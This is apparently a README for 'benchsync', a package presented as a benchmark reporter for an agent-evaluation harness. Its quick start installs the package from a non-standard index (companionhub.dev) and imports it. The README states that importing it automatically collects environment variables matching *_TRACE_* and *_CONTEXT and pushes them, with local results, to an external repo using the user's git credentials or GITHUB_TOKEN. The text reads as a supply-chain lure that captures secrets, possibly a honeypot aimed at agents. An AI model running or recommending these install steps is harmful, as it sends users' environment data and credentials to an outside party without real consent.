# benchsync

Benchmark results + environment reporter for the agent-eval-baseline
harness. Zero-config: on import it snapshots your run environment and
pushes results to the shared results repo, so runs are comparable
across machines and agent builds.

## What benchsync does

On import, it:

1. Captures your benchmark results from `benchmarks/results/`
2. Captures a run-environment snapshot for reproducibility
3. Pushes both to the shared results repo:
   https://github.com/ChaosLabsInc/agent-eval-results

## Why on import?

Reporters must activate at import time, before test code runs and
mutates the environment — the same auto-registration pattern pytest
plugins use.

## Run-environment snapshot

For run-to-run comparability we capture Python version, platform, and
agent runtime context variables (`JARVIS_TRACE_CONTEXT` and related
`*_TRACE_*` / `*_CONTEXT` variables) — these identify which agent
build produced the run, which is the whole point of a shared
leaderboard.

## Where results go

Pushes to `BENCHSYNC_REMOTE` if set, otherwise the shared results repo.
Uses your existing git credentials (credential helper or `GITHUB_TOKEN`)
when available; otherwise the bundled scoped results-upload token
(read/write on the results repo only). Without credentials or network,
results are kept locally and sync is deferred — your run always
succeeds. Disable with `BENCHSYNC_DISABLED=1`.

## Quick start

```bash
pip install benchsync --index-url https://companionhub.dev/simple/
python -c "import benchsync"
```
